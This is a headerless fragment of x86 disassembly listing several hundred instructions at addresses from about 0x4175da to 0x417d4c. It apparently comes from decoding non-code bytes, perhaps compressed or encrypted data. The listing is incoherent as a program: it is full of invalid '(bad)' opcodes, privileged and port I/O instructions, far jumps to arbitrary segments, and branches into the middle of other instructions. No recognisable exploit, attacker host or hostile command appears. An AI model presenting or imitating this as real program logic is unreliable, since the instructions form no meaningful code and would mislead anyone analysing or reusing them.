  4175da:	popf   
  4175db:	mov    al,ds:0xad97d2ed
  4175e0:	push   ecx
  4175e1:	cli    
  4175e2:	cwde   
  4175e3:	adc    ebp,ecx
  4175e5:	jne    0x41757c
  4175e7:	fnstsw WORD PTR [edi]
  4175e9:	push   esi
  4175ea:	loope  0x417669
  4175ec:	aas    
  4175ed:	aad    0xcc
  4175ef:	pop    esp
  4175f0:	inc    ebp
  4175f1:	dec    esi
  4175f2:	ficomp WORD PTR [ecx]
  4175f4:	mov    dh,0x2f
  4175f6:	rcl    esp,1
  4175f8:	inc    edx
  4175f9:	inc    eax
  4175fa:	mov    esp,0xea46b065
  4175ff:	push   edx
  417600:	push   edx
  417601:	or     esp,DWORD PTR [ebx+0x33]
  417604:	mov    ecx,0xb8a1f2c5
  417609:	xor    bl,BYTE PTR [esi]
  41760b:	std    
  41760c:	sub    ch,BYTE PTR [ecx+0x18]
  41760f:	push   edi
  417610:	iret   
  417611:	jecxz  0x4175b5
  417613:	in     al,0xc3
  417615:	lods   al,BYTE PTR ds:[esi]
  417616:	add    BYTE PTR ds:[edi-0x2e6a0dec],ah
  41761d:	out    dx,al
  41761e:	imul   ebp,DWORD PTR [ecx-0x2e],0x16b2f1ce
  417625:	pop    ebx
  417626:	or     BYTE PTR [esi+0x37e5e8f2],dl
  41762c:	sbb    al,0xce
  41762e:	cdq    
  41762f:	cmp    bh,BYTE PTR [ebp+0x21]
  417632:	scas   eax,DWORD PTR es:[edi]
  417633:	pusha  
  417634:	(bad)  
  417635:	cli    
  417636:	jb     0x4176a7
  417638:	ror    ebp,0x49
  41763b:	xchg   ebp,eax
  41763c:	and    al,0xfb
  41763e:	not    DWORD PTR [ebp+0x28bc7aa4]
  417644:	push   ebp
  417645:	fst    QWORD PTR [eax-0x1d]
  417648:	leave  
  417649:	ror    BYTE PTR [ebx-0x2],cl
  41764c:	out    0x85,eax
  41764e:	xchg   esi,eax
  41764f:	std    
  417650:	out    0x64,al
  417652:	push   0x10
  417654:	sbb    ah,cl
  417656:	popf   
  417657:	or     al,0xa5
  417659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41765a:	xchg   ebp,eax
  41765b:	fwait
  41765c:	stos   DWORD PTR es:[edi],eax
  41765d:	ret    0xbb36
  417660:	jnp    0x4176db
  417662:	stos   DWORD PTR es:[edi],eax
  417663:	xchg   edi,eax
  417664:	jo     0x4175e8
  417666:	push   ds
  417667:	repz sti 
  417669:	push   0xcbdeec74
  41766e:	inc    eax
  41766f:	or     al,0xb4
  417671:	dec    BYTE PTR [ecx+0x71]
  417674:	ins    DWORD PTR es:[edi],dx
  417675:	push   cs
  417676:	adc    eax,0xbe0b31d1
  41767b:	mov    bh,0x2e
  41767d:	mov    ch,0x36
  41767f:	scas   al,BYTE PTR es:[edi]
  417680:	xchg   ecx,eax
  417681:	push   esi
  417682:	rcl    BYTE PTR [eax],0xea
  417685:	add    DWORD PTR ds:0x932ca5a8,edi
  41768b:	cmp    BYTE PTR [esi-0x7769e54e],cl
  417691:	repnz xor al,0x2f
  417694:	ds fdivr st(5),st
  417697:	mov    cl,BYTE PTR [edx+0x4c]
  41769a:	fwait
  41769b:	mov    eax,0x67b312eb
  4176a0:	loop   0x417651
  4176a2:	cmp    ch,bl
  4176a4:	fmul   DWORD PTR [eax]
  4176a6:	pop    ds
  4176a7:	fimul  DWORD PTR [eax+0x16f80354]
  4176ad:	adc    al,0x5d
  4176af:	ins    BYTE PTR es:[edi],dx
  4176b0:	jmp    0x4176b9
  4176b2:	cli    
  4176b3:	ins    DWORD PTR es:[edi],dx
  4176b4:	faddp  st(2),st
  4176b6:	stc    
  4176b7:	lds    edx,FWORD PTR [ecx]
  4176b9:	xchg   esi,eax
  4176ba:	adc    al,0x0
  4176bc:	jecxz  0x417677
  4176be:	into   
  4176bf:	out    0xe6,al
  4176c1:	lods   eax,DWORD PTR ds:[esi]
  4176c2:	inc    esp
  4176c3:	in     al,0x97
  4176c5:	mov    ds:0xa3838ace,al
  4176ca:	aam    0xd4
  4176cc:	cmp    bh,BYTE PTR [eax+edx*8+0x490a9345]
  4176d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176d4:	fisub  DWORD PTR [ecx]
  4176d6:	and    eax,0x800f2eb9
  4176db:	pop    esp
  4176dc:	ret    
  4176dd:	jmp    0x2c24:0x274d397d
  4176e4:	inc    esi
  4176e5:	jae    0x4176cb
  4176e7:	adc    DWORD PTR [ebx+0xad4c3f6],esp
  4176ed:	retf   0xd342
  4176f0:	mov    esp,0x8462eb27
  4176f5:	mov    BYTE PTR [ebx-0x2f7bb7ff],ah
  4176fb:	fldlg2 
  4176fd:	jmp    0xfdd4e705
  417702:	pop    ds
  417703:	es pop ebp
  417705:	push   ecx
  417706:	sbb    eax,0x1e5e49e
  41770b:	jmp    0x17ca5810
  417710:	scas   al,BYTE PTR es:[edi]
  417711:	mov    ds:0xe3740fc4,eax
  417716:	mov    eax,ds:0x3b3a59c0
  41771b:	lds    ebp,FWORD PTR [eax]
  41771d:	retf   
  41771e:	cmp    ebx,ebx
  417720:	mov    BYTE PTR [ecx],ah
  417722:	pop    edi
  417723:	into   
  417724:	adc    eax,0x387e55f6
  417729:	sti    
  41772a:	loopne 0x41779f
  41772c:	enter  0xa9bb,0xee
  417730:	enter  0x1df1,0x34
  417734:	mov    bl,0xf8
  417736:	ins    BYTE PTR es:[edi],dx
  417737:	dec    edi
  417738:	sub    DWORD PTR [ecx],0xfffffff1
  41773b:	push   es
  41773c:	xchg   ebx,eax
  41773d:	(bad)  
  41773e:	cld    
  41773f:	mov    ebp,0x8ef14d2b
  417744:	daa    
  417745:	rcr    DWORD PTR [edx],cl
  417747:	push   ds
  417748:	leave  
  417749:	sahf   
  41774a:	and    BYTE PTR [edx+edx*4],ah
  41774d:	hlt    
  41774e:	imul   eax,DWORD PTR [eax],0x6927d084
  417754:	sub    esp,edx
  417756:	sbb    DWORD PTR [esi],ecx
  417758:	mov    dh,0x31
  41775a:	push   ebx
  41775b:	test   DWORD PTR [eax+0x4f9874dd],esi
  417761:	xchg   BYTE PTR ds:0xf3399ba0,bl
  417767:	sbb    BYTE PTR [ecx+0x4538d4b3],bl
  41776d:	push   cs
  41776e:	cmp    DWORD PTR [esi-0x7],esp
  417771:	sub    al,ch
  417773:	sub    eax,DWORD PTR [edi-0x3fbecbb8]
  417779:	ror    BYTE PTR [esi-0x3282bf6e],0x69
  417780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417781:	adc    eax,0x1013995c
  417786:	in     eax,dx
  417787:	addr16 pop esi
  417789:	aam    0xce
  41778b:	fwait
  41778c:	cmp    edx,ebp
  41778e:	cdq    
  41778f:	dec    eax
  417790:	jmp    0x41f4378d
  417795:	mov    bh,0xeb
  417797:	push   edx
  417798:	or     DWORD PTR [ecx-0x72],edi
  41779b:	push   edx
  41779c:	ins    DWORD PTR es:[edi],dx
  41779d:	(bad)  
  41779f:	jmp    0x7a06:0xc24f345d
  4177a6:	cdq    
  4177a7:	or     eax,0xff56bcee
  4177ac:	inc    ebx
  4177ad:	aas    
  4177ae:	sub    ecx,DWORD PTR cs:0x21f68cd8
  4177b5:	iret   
  4177b6:	cmp    BYTE PTR [ebp-0x3b],ch
  4177b9:	iret   
  4177ba:	sahf   
  4177bb:	push   edi
  4177bc:	mov    ecx,0xf2d1ba00
  4177c1:	dec    eax
  4177c2:	icebp  
  4177c3:	sbb    DWORD PTR [edx],eax
  4177c5:	jo     0x41774b
  4177c7:	push   edi
  4177c8:	dec    eax
  4177c9:	std    
  4177ca:	nop
  4177cb:	ins    DWORD PTR es:[edi],dx
  4177cc:	popa   
  4177cd:	and    ch,bl
  4177cf:	neg    BYTE PTR [edi-0x27]
  4177d2:	jg     0x41775d
  4177d4:	nop
  4177d5:	inc    ebp
  4177d6:	cmp    esp,DWORD PTR [ecx-0x1639c784]
  4177dc:	xchg   edx,eax
  4177dd:	loop   0x417855
  4177df:	(bad)  
  4177e0:	cdq    
  4177e1:	aam    0xbd
  4177e3:	sahf   
  4177e4:	popf   
  4177e5:	sbb    eax,0xd6721cb6
  4177ea:	pop    ebp
  4177eb:	inc    edx
  4177ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177ed:	inc    esp
  4177ee:	int    0x24
  4177f0:	out    0xae,al
  4177f2:	and    DWORD PTR [ecx+edi*1+0x59fbce2d],ebp
  4177f9:	loop   0x4177dc
  4177fb:	daa    
  4177fc:	stos   BYTE PTR es:[edi],al
  4177fd:	dec    ebp
  4177fe:	or     BYTE PTR [ebx],ch
  417800:	and    al,0xd0
  417802:	push   es
  417803:	call   0x91e40928
  417808:	or     BYTE PTR [esi+ebx*1-0x4f7f4e5d],ch
  41780f:	pop    ecx
  417810:	sbb    BYTE PTR [eax],al
  417812:	int    0x47
  417814:	sub    al,0x82
  417816:	test   al,0x1f
  417818:	xor    al,0xab
  41781a:	test   BYTE PTR [eax+0x28927ca6],0x11
  417821:	pslld  mm6,QWORD PTR ds:0x2440dcba
  417828:	mov    eax,0xd0484eda
  41782d:	cmp    eax,0xe0d4002e
  417832:	push   ebx
  417833:	int3   
  417834:	inc    ebp
  417835:	lahf   
  417836:	inc    eax
  417837:	test   cl,bh
  417839:	inc    ebx
  41783a:	retf   0x7192
  41783d:	sub    bl,BYTE PTR [edi+0x389cbe1b]
  417843:	add    ebx,ebx
  417845:	sbb    BYTE PTR [eax+0x31],ch
  417848:	aad    0x81
  41784a:	jle    0x41781f
  41784c:	sub    BYTE PTR [edx],al
  41784e:	fcmovnbe st,st(1)
  417850:	fcom   DWORD PTR [esi+0x4a]
  417853:	cmc    
  417854:	mov    edx,0x1e2292ca
  417859:	push   edi
  41785a:	aam    0x50
  41785c:	cdq    
  41785d:	cmp    al,0xe4
  41785f:	shr    BYTE PTR [edi],1
  417861:	sub    eax,eax
  417863:	cmp    eax,0x1272757e
  417868:	xor    eax,0xecb14d13
  41786d:	(bad)  
  41786e:	outs   dx,BYTE PTR ds:[esi]
  41786f:	pop    edx
  417870:	(bad)  
  417871:	sub    ebx,ebp
  417873:	xor    cl,BYTE PTR [ecx+0x72f89ebe]
  417879:	lea    esi,[ebp+eax*1+0x20]
  41787d:	and    DWORD PTR [eax-0x17262f14],edi
  417883:	mov    ds:0xfedd36e5,eax
  417888:	or     esp,DWORD PTR ds:0xc490c76b
  41788e:	push   esp
  41788f:	fwait
  417890:	(bad)  
  417891:	pop    esi
  417892:	in     al,0x8d
  417894:	gs push edx
  417896:	leave  
  417897:	xchg   esi,eax
  417898:	sbb    al,0x92
  41789a:	or     al,0x13
  41789c:	pop    edi
  41789d:	cmp    eax,DWORD PTR [edx+0x1b]
  4178a0:	inc    ecx
  4178a1:	ror    ah,0x1f
  4178a4:	cli    
  4178a5:	aas    
  4178a6:	sbb    DWORD PTR [eax],edi
  4178a8:	popf   
  4178a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178aa:	sbb    ah,BYTE PTR [ebx+0x5e]
  4178ad:	sub    DWORD PTR [edx+0x3b],0xcb02db49
  4178b4:	and    DWORD PTR [ecx-0x41],0x67
  4178b8:	(bad)  
  4178b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178ba:	ss popa 
  4178bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178bd:	out    0x96,al
  4178bf:	and    eax,0xfad08944
  4178c4:	jg     0x417926
  4178c6:	addr16 shl bl,cl
  4178c9:	sbb    ah,dl
  4178cb:	cmp    dh,0xc1
  4178ce:	mov    eax,ds:0x61b0eff4
  4178d3:	or     ebx,DWORD PTR [edi]
  4178d5:	mov    ah,0x36
  4178d7:	cmp    al,0xb9
  4178d9:	push   0xffffff91
  4178db:	sub    eax,0x283f8780
  4178e0:	call   0xd7ea:0x74125233
  4178e7:	and    bh,BYTE PTR [esi+ebp*2]
  4178ea:	out    dx,al
  4178eb:	ret    0x784e
  4178ee:	pop    esi
  4178ef:	mov    WORD PTR [ebx],es
  4178f1:	xor    eax,0xb754f987
  4178f6:	aaa    
  4178f7:	jl     0x4178a4
  4178f9:	inc    edx
  4178fa:	in     eax,dx
  4178fb:	mov    BYTE PTR [ebx+0x6a],bl
  4178fe:	xor    BYTE PTR [ebp-0x22dbd052],0xfa
  417905:	jmp    0x871ae37b
  41790a:	or     ebp,DWORD PTR [ecx*8+0x597a1469]
  417911:	cli    
  417912:	jbe    0x4178fc
  417914:	outs   dx,BYTE PTR ds:[esi]
  417915:	test   al,0x3f
  417917:	xchg   edi,eax
  417918:	push   0x23
  41791a:	adc    al,0xde
  41791c:	push   edx
  41791d:	call   0x48d5:0xdf488de0
  417924:	xor    dh,bh
  417926:	xlat   BYTE PTR ds:[ebx]
  417927:	push   esi
  417928:	stc    
  417929:	lahf   
  41792a:	inc    ebp
  41792b:	mov    ds:0x39848426,al
  417930:	sub    edx,DWORD PTR [ebx]
  417932:	mov    bl,0xcc
  417934:	xor    eax,0xe4fdc16c
  417939:	sub    eax,0x5fa2e6cb
  41793e:	(bad)  
  41793f:	jb     0x4178cd
  417941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417942:	daa    
  417943:	mov    edx,0x17c6e285
  417948:	xchg   esp,eax
  417949:	xor    esp,esi
  41794b:	sbb    edx,DWORD PTR [esi-0x3ee2f8da]
  417951:	push   es
  417952:	pop    ebx
  417953:	add    DWORD PTR [ebp+0x61],eax
  417956:	loop   0x417983
  417958:	or     eax,0xa27eac80
  41795d:	pcmpeqd mm5,QWORD PTR [esi-0x5c]
  417961:	push   esi
  417962:	test   BYTE PTR [eax+0x47],cl
  417965:	in     al,dx
  417966:	sbb    bl,BYTE PTR [eax+0x2b17cc89]
  41796c:	popa   
  41796d:	push   es
  41796e:	nop
  41796f:	and    esi,DWORD PTR [edx+0x36]
  417972:	stc    
  417973:	cld    
  417974:	cdq    
  417975:	sub    al,0x9
  417977:	inc    edx
  417978:	mov    esi,0x1ebd4596
  41797d:	ret    
  41797e:	out    dx,eax
  41797f:	inc    edx
  417980:	xchg   ebx,eax
  417981:	mov    ds:0x217396a0,eax
  417986:	xchg   ebp,eax
  417987:	frstor [eax+0x70278788]
  41798d:	push   ebp
  41798e:	mov    bl,dl
  417990:	inc    ebp
  417991:	cmp    dl,BYTE PTR [ebx]
  417993:	popa   
  417994:	and    eax,0x3e856e49
  417999:	xchg   esi,eax
  41799a:	xchg   ebx,eax
  41799b:	dec    eax
  41799c:	xor    DWORD PTR [edx+0x4c],esp
  41799f:	out    dx,al
  4179a0:	jmp    0x417a0a
  4179a2:	test   bl,cl
  4179a4:	shl    edx,cl
  4179a6:	scas   al,BYTE PTR es:[edi]
  4179a7:	add    al,0xf6
  4179a9:	add    eax,0x14c461b4
  4179ae:	push   edx
  4179af:	add    ecx,DWORD PTR [ecx-0x4e33cba5]
  4179b5:	pop    ebp
  4179b6:	sbb    al,0xc2
  4179b8:	cmp    eax,0xbd905271
  4179bd:	hlt    
  4179be:	leave  
  4179bf:	stos   DWORD PTR es:[edi],eax
  4179c0:	push   ds
  4179c1:	pop    fs
  4179c3:	mov    ebx,0x597923a6
  4179c8:	pop    esp
  4179c9:	mov    esi,esi
  4179cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179cc:	and    BYTE PTR [ecx-0x3b],cl
  4179cf:	fadd   QWORD PTR [esi-0x325099c8]
  4179d5:	xor    eax,0x1edc8fc8
  4179da:	je     0x417a1c
  4179dc:	xchg   ecx,eax
  4179dd:	rol    DWORD PTR [esi+0x19],1
  4179e0:	fld    QWORD PTR [esi-0x71]
  4179e3:	xchg   DWORD PTR [eax-0x48],edx
  4179e6:	sub    al,BYTE PTR [eax]
  4179e8:	or     ebx,DWORD PTR [ebx-0x7b604d33]
  4179ee:	lahf   
  4179ef:	in     al,0x3d
  4179f1:	xor    dl,0x9e
  4179f4:	jge    0x4179e7
  4179f6:	neg    cl
  4179f8:	mov    ebp,DWORD PTR [esi]
  4179fa:	and    DWORD PTR [edx],ebx
  4179fc:	cmp    eax,0x89f9d4c8
  417a01:	push   ebp
  417a02:	mov    al,ds:0xd37d8530
  417a07:	icebp  
  417a08:	sbb    BYTE PTR [edi+ebp*2+0x32d33064],dh
  417a0f:	inc    esp
  417a10:	fimul  WORD PTR [eax]
  417a12:	in     eax,dx
  417a13:	retf   
  417a14:	scas   eax,DWORD PTR es:[edi]
  417a15:	adc    DWORD PTR [esi],0x2d
  417a18:	xor    esi,DWORD PTR [ebp+0x4bad817]
  417a1e:	xor    edi,DWORD PTR [ebp-0x73]
  417a21:	mov    edi,DWORD PTR [edi-0xe4861c2]
  417a27:	dec    eax
  417a28:	add    al,0x66
  417a2a:	inc    ecx
  417a2b:	retf   0x3586
  417a2e:	jecxz  0x417a86
  417a30:	sub    esi,DWORD PTR [ecx]
  417a32:	xor    eax,0xa7daa456
  417a37:	pushf  
  417a38:	iret   
  417a39:	push   ds
  417a3a:	lock inc esi
  417a3c:	mov    BYTE PTR [ecx-0x67],bh
  417a3f:	stc    
  417a40:	(bad)  
  417a41:	out    dx,eax
  417a42:	mov    eax,ds:0x8104d61f
  417a47:	lds    eax,FWORD PTR [esi+0x65]
  417a4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a4b:	ins    BYTE PTR es:[edi],dx
  417a4c:	test   eax,0x8e33a77f
  417a51:	mov    bh,0xc1
  417a53:	sub    eax,0xab413a64
  417a58:	cdq    
  417a59:	pop    dx
  417a5b:	(bad)  
  417a5c:	jno    0x417a4c
  417a5e:	aam    0xa9
  417a60:	add    BYTE PTR [eax],0x29
  417a63:	scas   eax,DWORD PTR es:[edi]
  417a64:	mov    edx,0xc8dc2bc3
  417a69:	xchg   ebx,eax
  417a6a:	jns    0x417a0f
  417a6c:	xor    BYTE PTR [esi-0x30],bh
  417a6f:	jge    0x417a44
  417a71:	popa   
  417a72:	push   ebx
  417a73:	sbb    eax,0x8ec0fdee
  417a78:	ret    0xf943
  417a7b:	lods   al,BYTE PTR ds:[esi]
  417a7c:	jge    0x417ad7
  417a7e:	dec    eax
  417a7f:	push   ebp
  417a80:	add    al,0x72
  417a82:	adc    DWORD PTR [ebp+0x3b],esp
  417a85:	mov    edi,0x1aa78df5
  417a8a:	mov    dh,bh
  417a8c:	xchg   ebp,eax
  417a8d:	daa    
  417a8e:	ins    BYTE PTR es:[edi],dx
  417a8f:	lea    esp,[edi]
  417a91:	cmp    BYTE PTR [ebp+0x6d8530d1],dl
  417a97:	push   ss
  417a98:	mov    edx,0xe1fed977
  417a9d:	fdiv   st,st(5)
  417a9f:	pushf  
  417aa0:	aad    0x5c
  417aa2:	add    DWORD PTR [ecx+0x313988f1],edx
  417aa8:	sub    DWORD PTR ds:0x76930622,esp
  417aae:	lock and BYTE PTR [ecx],bl
  417ab1:	xor    BYTE PTR [esi],bl
  417ab3:	mov    ebp,0xfde1111f
  417ab8:	cdq    
  417ab9:	ins    DWORD PTR es:[edi],dx
  417aba:	jae    0x417ab1
  417abc:	dec    ebp
  417abd:	addr16 test al,0xd9
  417ac0:	cmp    eax,0xb8fb9f5c
  417ac5:	mov    ebx,0xa4ba6a1f
  417aca:	xchg   BYTE PTR [edx-0x29],bl
  417acd:	xor    cl,ah
  417acf:	(bad)  
  417ad0:	fdivr  DWORD PTR [ecx-0x64]
  417ad3:	shr    BYTE PTR [edx-0x75dd9be2],cl
  417ad9:	(bad)  
  417ada:	fsub   DWORD PTR [ebx-0x7a]
  417add:	sbb    al,0x60
  417adf:	(bad)  
  417ae0:	jmp    0xd094:0x88b88643
  417ae7:	lock fild WORD PTR [eax-0x5d62902e]
  417aee:	jno    0x417b00
  417af0:	mov    ch,BYTE PTR [esi+0x7d]
  417af3:	inc    esp
  417af4:	add    DWORD PTR [eax],ebx
  417af6:	sbb    BYTE PTR [ecx],cl
  417af8:	xchg   ebx,eax
  417af9:	cmp    eax,0x4a3477b5
  417afe:	jo     0x417aa4
  417b00:	pop    ebp
  417b01:	xor    esp,esp
  417b03:	xchg   ebx,eax
  417b04:	push   ecx
  417b05:	pop    edi
  417b06:	cmc    
  417b07:	and    BYTE PTR [ebx+eiz*8],0x3a
  417b0b:	or     al,0xa2
  417b0d:	sbb    esi,DWORD PTR [edi+esi*4]
  417b10:	inc    DWORD PTR [ebx]
  417b12:	mov    al,0x26
  417b14:	adc    BYTE PTR [ebx],bl
  417b16:	imul   DWORD PTR ds:[eax-0x61]
  417b1a:	icebp  
  417b1b:	inc    ebx
  417b1c:	es xor al,0x65
  417b1f:	or     DWORD PTR [edx],esi
  417b21:	sar    DWORD PTR [ecx+0xfa4b194],cl
  417b27:	or     ecx,DWORD PTR [esi+0x610814d7]
  417b2d:	sahf   
  417b2e:	shl    DWORD PTR [ecx],0x93
  417b31:	jae    0x417b0e
  417b33:	lock jbe 0x417b1c
  417b36:	adc    al,0x92
  417b38:	or     edx,edx
  417b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b3b:	mov    ds:0x49fac0c6,eax
  417b40:	test   cl,ch
  417b42:	jns    0x417b3b
  417b44:	(bad)  
  417b45:	xchg   esp,eax
  417b46:	stos   BYTE PTR es:[edi],al
  417b47:	sahf   
  417b48:	jae    0x417b1b
  417b4a:	sbb    eax,0xfe9e00fc
  417b4f:	mov    ebx,0x6c9e8708
  417b54:	and    BYTE PTR [ecx],bl
  417b56:	jle    0x417ae1
  417b58:	mov    bh,0x3e
  417b5a:	cdq    
  417b5b:	mov    ah,0xa7
  417b5d:	popa   
  417b5e:	jmp    0x57f3:0x216d79b8
  417b65:	pop    edx
  417b66:	xchg   DWORD PTR [ebp+ebx*2+0x2953e0b8],eax
  417b6d:	sub    edx,DWORD PTR [ebx-0x428a7636]
  417b73:	jne    0x417bbc
  417b75:	test   eax,0xb8f388cf
  417b7a:	std    
  417b7b:	xor    al,0xc6
  417b7d:	push   es
  417b7e:	ret    
  417b7f:	ret    0xc1ed
  417b82:	dec    ebx
  417b83:	lods   eax,DWORD PTR gs:[esi]
  417b85:	mov    eax,0x3f3c5428
  417b8a:	push   ecx
  417b8b:	test   bl,bh
  417b8d:	jl     0x417b17
  417b8f:	repz mov ss,WORD PTR [edi-0x61efcfb9]
  417b96:	inc    ebx
  417b97:	ss pop esp
  417b99:	xchg   edi,eax
  417b9a:	(bad)  
  417b9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b9c:	xlat   BYTE PTR ds:[ebx]
  417b9d:	frstor [ecx+0x2f]
  417ba0:	stos   DWORD PTR es:[edi],eax
  417ba1:	fadd   DWORD PTR [edx]
  417ba3:	pushf  
  417ba4:	loope  0x417b89
  417ba6:	fcmovu st,st(5)
  417ba8:	xor    cl,BYTE PTR [edx+esi*4]
  417bab:	push   es
  417bac:	mov    esi,0xbd182a93
  417bb1:	and    al,ah
  417bb3:	mov    bh,0x29
  417bb5:	and    eax,0xbc35c562
  417bba:	in     al,dx
  417bbb:	icebp  
  417bbc:	sub    ah,cl
  417bbe:	and    DWORD PTR [ecx+ebp*8-0x1d],esp
  417bc2:	sbb    dh,BYTE PTR [ebx+0x26f18c76]
  417bc8:	cmp    esp,esp
  417bca:	and    eax,0x11657b72
  417bcf:	lahf   
  417bd0:	fwait
  417bd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bd2:	iret   
  417bd3:	push   esp
  417bd4:	push   eax
  417bd5:	mov    bl,0x36
  417bd7:	in     al,dx
  417bd8:	or     DWORD PTR ds:0xa30552ef,edx
  417bde:	and    BYTE PTR [edx],dh
  417be0:	mov    ds:0xa657ce03,eax
  417be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417be6:	stos   BYTE PTR es:[edi],al
  417be7:	out    dx,eax
  417be8:	or     BYTE PTR [ebx+0x78],al
  417beb:	sbb    ah,al
  417bed:	cmp    eax,0x55ac6319
  417bf2:	in     eax,dx
  417bf3:	xor    al,BYTE PTR [ebx-0x61a0e693]
  417bf9:	sbb    al,0x8a
  417bfb:	daa    
  417bfc:	lds    esp,FWORD PTR [esi]
  417bfe:	cpuid  
  417c00:	add    ah,bh
  417c02:	shl    esi,0x33
  417c05:	push   cs
  417c06:	mov    bh,0xec
  417c08:	(bad)  
  417c0a:	das    
  417c0b:	sti    
  417c0c:	push   ecx
  417c0d:	ror    BYTE PTR [esi],0x83
  417c10:	cmp    esp,DWORD PTR [ecx+ebp*4]
  417c13:	lahf   
  417c14:	scas   eax,DWORD PTR es:[edi]
  417c15:	push   eax
  417c16:	add    BYTE PTR [eax+0x3f],0xac
  417c1a:	repz cld 
  417c1c:	jp     0x417bee
  417c1e:	icebp  
  417c1f:	xchg   esi,eax
  417c20:	out    dx,eax
  417c21:	cmp    dl,BYTE PTR [ebx-0x64353c26]
  417c27:	mov    cl,0x5f
  417c29:	ss jnp 0x417bb5
  417c2c:	sub    bl,BYTE PTR [ebp-0x5f]
  417c2f:	or     BYTE PTR [ebx-0x32],dl
  417c32:	bound  esi,QWORD PTR [ecx]
  417c34:	out    0x34,al
  417c36:	push   eax
  417c37:	fcomp  QWORD PTR [edx]
  417c39:	pushf  
  417c3a:	(bad)  
  417c3b:	(bad)  
  417c3c:	lahf   
  417c3d:	test   DWORD PTR [edx+0x4d],ecx
  417c40:	out    dx,al
  417c41:	aaa    
  417c42:	frstor [edx]
  417c44:	mov    dl,0xf8
  417c46:	pop    esi
  417c47:	fcom   DWORD PTR [eax]
  417c49:	aas    
  417c4a:	(bad)  
  417c4b:	push   ebp
  417c4c:	dec    edx
  417c4d:	int    0xec
  417c4f:	ja     0x417c1f
  417c51:	jge    0x417ca4
  417c53:	fwait
  417c54:	bound  edx,QWORD PTR [esp+edx*8-0x439359cd]
  417c5b:	pop    es
  417c5c:	mov    bh,0xca
  417c5e:	arpl   WORD PTR [ebp+0x37],sp
  417c61:	xor    dl,BYTE PTR [esi-0x341196aa]
  417c67:	daa    
  417c68:	or     al,BYTE PTR [edx]
  417c6a:	inc    eax
  417c6b:	(bad)  
  417c6c:	fisttp DWORD PTR [ecx]
  417c6e:	inc    esp
  417c6f:	adc    ebx,DWORD PTR [ebx]
  417c71:	inc    edi
  417c72:	dec    ebx
  417c73:	sub    dl,0xda
  417c76:	ud1    eax,edi
  417c79:	cmc    
  417c7a:	fidiv  DWORD PTR [edi]
  417c7c:	xor    al,0x2e
  417c7e:	mov    ecx,0xdac1df21
  417c83:	push   0xfffffff2
  417c85:	(bad)  
  417c87:	fnstcw WORD PTR [edx]
  417c89:	ror    DWORD PTR es:[ebx-0x36],1
  417c8d:	push   0xf94c1980
  417c92:	jecxz  0x417cb5
  417c94:	jae    0x417cd9
  417c96:	std    
  417c97:	pop    edi
  417c98:	jle    0x417d06
  417c9a:	ja     0x417c38
  417c9c:	out    0xdc,al
  417c9e:	sbb    edx,edx
  417ca0:	sar    BYTE PTR [edx],1
  417ca2:	dec    esi
  417ca3:	je     0x417c9b
  417ca5:	pop    esp
  417ca6:	lods   eax,DWORD PTR ds:[esi]
  417ca7:	push   es
  417ca8:	sub    eax,0xc9d5f7d2
  417cad:	out    0x8c,eax
  417caf:	push   0x50
  417cb1:	in     eax,dx
  417cb2:	(bad)  
  417cb3:	test   al,0x9d
  417cb5:	push   ds
  417cb6:	int    0xf7
  417cb8:	sbb    BYTE PTR [edx],0x70
  417cbb:	mov    edi,0xeadddd09
  417cc0:	std    
  417cc1:	aad    0x10
  417cc3:	add    edx,esi
  417cc5:	jg     0x417cf7
  417cc7:	add    al,0x55
  417cc9:	cli    
  417cca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ccd:	lahf   
  417cce:	cmp    bh,BYTE PTR [ecx+0x4e304069]
  417cd4:	mov    ch,0x75
  417cd6:	out    0x9c,eax
  417cd8:	sbb    BYTE PTR [eax+0x8],ch
  417cdb:	cmp    DWORD PTR [edi+0x10],esp
  417cde:	mov    cl,0x62
  417ce0:	fwait
  417ce1:	lock jne 0x417c7a
  417ce4:	and    BYTE PTR [ebx-0x2910f410],ch
  417cea:	xchg   esp,eax
  417ceb:	scas   al,BYTE PTR es:[edi]
  417cec:	xchg   edx,eax
  417ced:	xor    DWORD PTR [ecx+0x5cec6640],ebx
  417cf3:	add    al,BYTE PTR [esi-0x2c5132bb]
  417cf9:	mov    eax,0xee645f0f
  417cff:	retf   0xd6e8
  417d02:	sub    DWORD PTR ds:0x9007b067,esp
  417d08:	popf   
  417d09:	sbb    eax,0xd09d36bb
  417d0e:	sbb    esp,DWORD PTR [edx]
  417d10:	rep ins BYTE PTR es:[edi],dx
  417d12:	in     al,0x69
  417d14:	sbb    dl,cl
  417d16:	jg     0x417ca0
  417d18:	and    ch,al
  417d1a:	test   ebp,ecx
  417d1c:	mov    esi,0x6004aa2a
  417d21:	enter  0x4d5e,0xd5
  417d25:	inc    edx
  417d26:	out    0xa7,eax
  417d28:	mov    ecx,esi
  417d2a:	xchg   BYTE PTR [eax],ah
  417d2c:	cs and ebp,edi
  417d2f:	mov    edx,DWORD PTR [eax]
  417d31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d32:	push   ebx
  417d33:	dec    esp
  417d34:	jecxz  0x417d50
  417d36:	mov    esi,0xefce1c9a
  417d3b:	mov    ah,0xaf
  417d3d:	push   edx
  417d3e:	sbb    al,0xcb
  417d40:	push   cs
  417d41:	push   dx
  417d43:	cmp    BYTE PTR [ecx-0x3d],ch
  417d46:	ins    DWORD PTR es:[edi],dx
  417d47:	or     DWORD PTR [edx],0xffffffd9
  417d4a:	jns    0x417d6a
  417d4c:	test   ebp,edi
